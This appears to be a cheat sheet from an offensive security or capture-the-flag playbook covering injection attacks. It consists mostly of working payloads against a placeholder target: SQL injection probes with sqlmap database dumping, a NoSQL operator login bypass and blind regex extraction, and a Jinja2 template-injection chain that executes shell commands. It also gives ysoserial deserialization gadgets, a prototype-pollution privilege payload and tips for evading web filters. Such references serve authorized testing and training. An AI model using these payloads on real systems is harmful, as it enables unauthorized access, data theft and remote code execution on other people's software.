# Injection — SQLi, NoSQLi, SSTI, Deserialization, Prototype Pollution

## Fastest First-Pass Checklist

```bash
# Purpose: cheap SQLi probe — single quote often triggers a visible DB error
curl -s "https://target.example/item?id=1'"

# Purpose: cheap SSTI probe — math expression evaluates if template injection exists
curl -s "https://target.example/search?q={{7*7}}"

# Purpose: cheap NoSQLi probe — operator injection on a login form
curl -s -X POST https://target.example/login -H 'Content-Type: application/json' -d '{"user":"admin","pass":{"$ne":null}}'
```

## Technique: SQL Injection

**When to use it**: any parameter that plausibly feeds a database query
(IDs, search boxes, login forms, sort/filter params).

**Fast path**:
```bash
# Purpose: manual boolean-based confirmation
curl -s "https://target.example/item?id=1 AND 1=1"   # should behave normally
curl -s "https://target.example/item?id=1 AND 1=2"   # should behave differently if injectable

# Purpose: automate detection + exploitation once a candidate param is identified
sqlmap -u "https://target.example/item?id=1" --batch --dbs
```
**Indicators**: differing response (error, content length, timing) between
`1=1` and `1=2` payloads; a raw DB error message reflected in the response.

**Next Step**: `sqlmap --batch --dump` on the confirmed injectable
parameter/table once schema is enumerated; for blind/time-based, `sqlmap`'s
timing techniques beat manual `SLEEP()` probing for reliability.

**Common Mistakes**: not URL-encoding payloads when needed, missing
second-order SQLi (payload stored now, executed in a *different* later
query — check any field that gets displayed/used elsewhere later).

## Technique: NoSQL Injection

**When to use it**: MongoDB/similar backend (JSON bodies, `_id` params).

**Fast path**:
```bash
# Purpose: operator injection bypassing a password check via $ne (not-equal, matches anything but null)
curl -s -X POST https://target.example/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":""}}'

# Purpose: regex-based injection to extract data character-by-character (blind NoSQLi)
curl -s -X POST https://target.example/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$regex":"^a"}}'
```
**Indicators**: login succeeds with a `$ne`/`$gt`/`$regex` operator where a
plain string was expected — app is passing user JSON straight into a query
filter without type/structure validation.

## Technique: Server-Side Template Injection (SSTI)

**Fast path**:
```bash
# Purpose: generic math-expression probe works across many template engines
curl -s "https://target.example/render?name={{7*7}}"
curl -s "https://target.example/render?name=\${7*7}"
curl -s "https://target.example/render?name=#{7*7}"
```
**Indicators**: response contains `49` instead of the literal
`{{7*7}}`/`${7*7}` — confirms server-side evaluation, not just reflection.

**Next Step**: identify the specific engine (Jinja2, Twig, Freemarker,
Handlebars — payload syntax differs) then escalate to RCE-capable payloads
appropriate to that engine:
```bash
# Purpose: Jinja2 (Python/Flask) — read file contents via SSTI-to-RCE chain
curl -s "https://target.example/render?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}"
```

## Technique: Insecure Deserialization

**Indicators**: a cookie/param that looks like serialized data (Java:
`rO0`-prefixed base64; PHP: `O:8:"ClassName"`; Python pickle: often
base64/binary with recognizable opcodes; .NET: base64 with type info).

**Fast path**:
```bash
# Purpose: decode a suspected serialized cookie to confirm format before crafting a gadget chain
echo '<value>' | base64 -d | xxd | head

# Purpose: ysoserial generates Java deserialization gadget-chain payloads for known-vulnerable libs
java -jar ysoserial.jar CommonsCollections6 'id' | base64
```
**Next Step**: match the serialization format/library version to a known
public gadget chain rather than building one from scratch.

## Technique: Prototype Pollution (Node.js/JS)

**Indicators**: an endpoint that recursively merges user-controlled JSON
into an object (`Object.assign`, lodash `_.merge`, a custom deep-merge)
without filtering `__proto__`/`constructor.prototype`.

**Fast path**:
```bash
# Purpose: probe for prototype pollution by attempting to set a property via __proto__
curl -s -X POST https://target.example/api/settings -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
```
**Next Step**: check if the polluted property (`isAdmin`) now affects
*other, unrelated* requests/objects app-wide — that's the confirming
signal, not just that this one request accepted the payload.

## Common Mistakes

- Assuming a WAF-blocked simple payload means "not injectable" — try
  encoding variations, comment-based obfuscation (`/**/`), or case
  variation before concluding a dead end.
- Testing injection classes against parameters that don't plausibly reach
  the relevant sink (e.g. probing SSTI on a param never rendered through a
  template) — map param → sink first via source/JS inspection
  (`source-code-analysis.md`).
- Not checking JSON *and* form-encoded *and* multipart variants of the
  same endpoint — some frameworks parse bodies differently per
  content-type, changing what's injectable.
